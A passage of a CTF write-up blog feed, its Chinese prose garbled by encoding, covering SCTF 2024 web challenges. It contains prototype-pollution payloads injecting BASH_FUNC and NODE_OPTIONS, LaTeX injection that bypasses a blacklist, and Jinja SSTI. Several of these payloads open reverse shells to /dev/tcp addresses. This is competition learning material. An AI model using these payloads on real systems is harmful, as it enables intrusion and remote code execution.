class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./child_process&#x27;</span>);<br><br><span class="hljs-keyword">new</span> ritm.<span class="hljs-title class_">Hook</span>(<br>    [<span class="hljs-string">&#x27;child_process&#x27;</span>],<br>    <span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable language_">module</span>, name</span>) &#123;<br>        <span class="hljs-keyword">switch</span> (name) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;child_process&#x27;</span>: &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-variable language_">module</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// /app/handle/child_process.js</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchChildProcess</span>(<span class="hljs-params">cp</span>) &#123;<br><br>    cp.<span class="hljs-property">execFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFile</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">fork</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">fork</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">spawn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawn</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execFileSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execFileSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br>    cp.<span class="hljs-property">execSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">execSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>() &#125;);<br>    cp.<span class="hljs-property">spawnSync</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(cp.<span class="hljs-property">spawnSync</span>, &#123; <span class="hljs-attr">apply</span>: <span class="hljs-title function_">patchOptions</span>(<span class="hljs-literal">true</span>) &#125;);<br><br>    <span class="hljs-keyword">return</span> cp;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">patchOptions</span>(<span class="hljs-params">hasArgs</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>        <span class="hljs-keyword">var</span> pos = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (pos === args.<span class="hljs-property">length</span>) &#123;<br>            args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pos &lt; args.<span class="hljs-property">length</span>) &#123;<br>            <span class="hljs-keyword">if</span> (hasArgs &amp;&amp; (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(args[pos]) || args[pos] == <span class="hljs-literal">null</span>)) &#123;<br>                pos++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>(args[pos]);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (args[pos] == <span class="hljs-literal">null</span>) &#123;<br>                args[pos] = <span class="hljs-title function_">prototypelessSpawnOpts</span>();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> args[pos] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>                args.<span class="hljs-title function_">splice</span>(pos, <span class="hljs-number">0</span>, <span class="hljs-title function_">prototypelessSpawnOpts</span>());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> target.<span class="hljs-title function_">apply</span>(thisArg, args);<br>    &#125;;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">prototypelessSpawnOpts</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">var</span> prototypelessObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), obj);<br>    prototypelessObj.<span class="hljs-property">env</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>), prototypelessObj.<span class="hljs-property">env</span> || process.<span class="hljs-property">env</span>);<br>    <span class="hljs-keyword">return</span> prototypelessObj;<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = patchChildProcess;<br></code></pre></td></tr></table></figure><p>ç”¨çš„ç¯å¢ƒå˜é‡åŠ«æŒï¼Œpp2rceï¼Œç›´æ¥ä¿®æ”¹shellå˜é‡ï¼Œç”±äºå®ƒæœ¬åœ°æœ‰ä¸ª&#x2F;readflagæ‰€ä»¥èƒ½ç›´æ¥è¯»äº†ã€‚åˆå­¦åˆ°äº†å•Šï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><p>å­¦é•¿è¿™ä¹ˆæ‰“çš„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;argv0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/bin/bash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;BASH_FUNC_whoami%%&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;() &#123; /readflag &gt; /tmp/123; &#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>cookies=<span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;auth_token&quot;</span><span class="hljs-punctuation">:</span>admin_cookie<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ˜Ÿç›Ÿï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__proto__&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;reportmessage&quot;</span><span class="hljs-punctuation">:</span> <br>    <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/readflag&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span> <br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;NODE_DEBUG&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;require(\&quot;child_process\&quot;).exec(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;\&quot;);process.exit()//&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;--require /proc/self/environ&quot;</span><br><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>W&amp;M:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_report</span>(<span class="hljs-params">username,date,report</span>):<br>    resp = rs.post(remote_addr+<span class="hljs-string">&quot;/report&quot;</span>,json=&#123;<span class="hljs-string">&quot;user&quot;</span>:username,<span class="hljs-string">&quot;date&quot;</span>:date,<span class="hljs-string">&quot;reportmessage&quot;</span>:report&#125;)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-string">&#x27;Report Success&#x27;</span> <span class="hljs-keyword">in</span> resp.text<br><br>add_report(<span class="hljs-string">&quot;__proto__&quot;</span>,<span class="hljs-number">2</span>,&#123;<span class="hljs-string">&quot;shell&quot;</span>:<span class="hljs-string">&quot;/proc/self/exe&quot;</span>,<span class="hljs-string">&quot;argv0&quot;</span>:<span class="hljs-string">&quot;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;/bin/sh -i &gt;&amp; /dev/tcp/123.45.6.7/9999 0&gt;&amp;1\&quot;&#x27;).toString())//&quot;</span>,<span class="hljs-string">&quot;env&quot;</span>:&#123;<span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>:<span class="hljs-string">&quot;--require /proc/self/cmdline&quot;</span>&#125;&#125;)<br></code></pre></td></tr></table></figure><h2 id="ez-tex"><a href="#ez-tex" class="headerlink" title="ez_tex"></a>ez_tex</h2><p>æ²¡æ‰“å‡ºæ¥ï¼Œæœ‰ç‚¹é—æ†¾ã€‚W&amp;Mè¿˜æ˜¯å¤ªçŒ›äº†ã€‚</p><p>LaTex Injectionç»•æ‰€æœ‰é»‘åå•ï¼š</p><p>[PayloadsAllTheThings&#x2F;LaTeX Injection&#x2F;README.md at master Â· swisskyrepo&#x2F;PayloadsAllTheThings (github.com)](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX</a> Injection&#x2F;README.md)</p><p><img src="/2024/10/05/sctf-web-learning/image-20241006000009619.png" alt="image-20241006000009619"></p><p>æç¤º&#x2F;logï¼Œæœ‰ä¸ªapp.logä¸çŸ¥é“å’‹ç”¨ã€‚æƒ³æƒ³æ€ä¹ˆå¸¦å‡ºæ•°æ®ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\newread</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\openin</span><span class="hljs-keyword">\infile</span>=main.py<br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\openout</span><span class="hljs-keyword">\outfile</span>=a^^70p.l^^6fg<br><span class="hljs-keyword">\loop</span><span class="hljs-keyword">\unless</span><span class="hljs-keyword">\ifeof</span><span class="hljs-keyword">\infile</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\read</span><span class="hljs-keyword">\infile</span> to<span class="hljs-keyword">\line</span><br>    <span class="hljs-keyword">\imm</span>^^65diate<span class="hljs-keyword">\write</span><span class="hljs-keyword">\outfile</span>&#123;<span class="hljs-keyword">\line</span>&#125;<br><span class="hljs-keyword">\repeat</span><br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\outfile</span><br><span class="hljs-keyword">\closein</span><span class="hljs-keyword">\infile</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><p>è¯»åˆ°main.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">import</span> logging <br><span class="hljs-keyword">import</span> subprocess <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, redirect <br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename <br><br>app = Flask(__name__) <br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> app.debug: <br>        handler = logging.FileHandler(<span class="hljs-string">&#x27;app.log&#x27;</span>) <br>        handler.setLevel(logging.INFO) <br>        app.logger.addHandler(handler) <br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span> <br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER <br><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>) <br><br>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;tex&#x27;</span>&#125; <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>): <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> \ <br>        filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile_tex</span>(<span class="hljs-params">file_path</span>): <br>        output_filename = file_path.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.pdf&#x27;</span> <br>        <span class="hljs-keyword">try</span>: <br>                subprocess.check_call([<span class="hljs-string">&#x27;pdflatex&#x27;</span>, file_path]) <br>                <span class="hljs-keyword">return</span> output_filename <br>        <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e: <br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(e) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(): <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(): <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>] <br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>: <br>                <span class="hljs-keyword">return</span> redirect(request.url) <br><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename): <br>                content = file.read() <br>                <span class="hljs-keyword">try</span>: <br>                        content_str = content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) <br>                <span class="hljs-keyword">except</span> UnicodeDecodeError: <br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not decodable&#x27;</span> <br>                <span class="hljs-keyword">for</span> bad_char <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;\\x&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;write18&#x27;</span>, <span class="hljs-string">&#x27;immediate&#x27;</span>,<span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>]: <br>                        <span class="hljs-keyword">if</span> bad_char <span class="hljs-keyword">in</span> content_str: <br>                                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File content is not safe&#x27;</span> <br>                file.seek(<span class="hljs-number">0</span>) <br>                filename = secure_filename(file.filename) <br>                file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>                file.save(file_path) <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File uploaded successfully, And you can compile the tex file&#x27;</span> <br>        <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type or name&#x27;</span> <br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/compile&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compile</span>(): <br>        filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>) <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No filename provided&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(filename) &gt;= <span class="hljs-number">7</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file name length&#x27;</span>, <span class="hljs-number">400</span> <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename.endswith(<span class="hljs-string">&#x27;.tex&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type&#x27;</span>, <span class="hljs-number">400</span> <br><br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <br>        <span class="hljs-built_in">print</span>(file_path) <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File not found&#x27;</span>, <span class="hljs-number">404</span> <br><br>        output_pdf = compile_tex(file_path) <br>        <span class="hljs-keyword">if</span> output_pdf.endswith(<span class="hljs-string">&#x27;.pdf&#x27;</span>): <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Compilation succeeded&quot;</span> <br>        <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Compilation failed&#x27;</span>, <span class="hljs-number">500</span> <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/log&#x27;</span></span>) </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">log</span>(): <br>        <span class="hljs-keyword">try</span>: <br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> log_file: <br>                log_contents = log_file.read() <br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;log.html&#x27;</span>, log_contents=log_contents) <br>        <span class="hljs-keyword">except</span> FileNotFoundError: <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Log file not found&#x27;</span>, <span class="hljs-number">404</span> <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: <br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">3000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥sstiå°±å‡ºäº†ã€‚ä½†æ˜¯è¦é‡å¼€é¶æœºåœ¨ç¬¬ä¸€æ¬¡è®¿é—®&#x2F;logä¹‹å‰å†™ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>[]&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><span class="hljs-keyword">\newwrite</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\openout</span><span class="hljs-keyword">\t</span>=templates^^2flog.html<br><span class="hljs-keyword">\write</span><span class="hljs-keyword">\t</span>&#123;&#123;&#123;lipsum.<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>globals<span class="hljs-built_in">_</span><span class="hljs-built_in">_</span>[&#x27;os&#x27;].popen(&#x27;bash -c &quot;^^2fbin^^2fsh -i &gt;<span class="hljs-built_in">&amp;</span> ^^2fdev^^2ftcp^^2f1.1.1.1^^2f9999 0&gt;<span class="hljs-built_in">&amp;</span>1&quot;&#x27;).read()&#125;&#125;&#125;<br><span class="hljs-keyword">\closeout</span><span class="hljs-keyword">\t</span><br><span class="hljs-keyword">\newpage</span><br>foo<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><p>åå¼¹shellè¿›å»åæ²¡æƒé™ï¼Œå®ƒè¿˜ç»™äº†ä¸ªsshï¼Œé¢„æœŸè§£æ˜¯é€šè¿‡&#x2F;flagå¾—çŸ¥jerrywwwç”¨æˆ·åï¼Œç„¶åçˆ†ç ´å‡ºå¼±å¯†ç P@ssw0rdï¼Œéš¾ç»·ã€‚</p><p>W&amp;Mæ‰“äº†ä¸ªéé¢„æœŸï¼š&#x2F;usr&#x2F;bin&#x2F;python3.11 cap_setuid&#x3D;ep</p><p><img src="/2024/10/05/sctf-web-learning/image-20241006000438952.png" alt="image-20241006000438952"></p><p>ç‰›å­ã€‚</p><h2 id="havefun"><a href="#havefun" class="headerlink" title="havefun"></a>havefun</h2><p>rubyååºåˆ—åŒ–éƒ½æ¥äº†æˆ‘è‰ã€‚åé¢ç ”ç©¶ç ”ç©¶ã€‚</p><p>ï¼ˆæœªå®Œå¾…ç»­â€¦ï¼‰</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.wm-team.cn/index.php/archives/82/#ez_tex">SCTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p><p>[SCTF2024 Web&amp;Misc å¤ç° | 0piumâ€™s Blog (hack3r0pium.github.io)](<a href="https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&Misc-%E5%A4%8D%E7%8E%B0/index.html#:~:text=Web">https://hack3r0pium.github.io/hack3r0pium/2024/09/21/SCTF2024-Web&amp;Misc-å¤ç°/index.html#:~:text=Web</a> ezju)</p><p><a href="https://blog.xmcve.com/2024/10/01/SCTF-2024-Writeup/#title-20">SCTF 2024 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ (xmcve.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java Dynamic Proxy</title>
    <link href="/2024/09/27/Java-Dynamic-Proxy/"/>
    <url>/2024/09/27/Java-Dynamic-Proxy/</url>
    
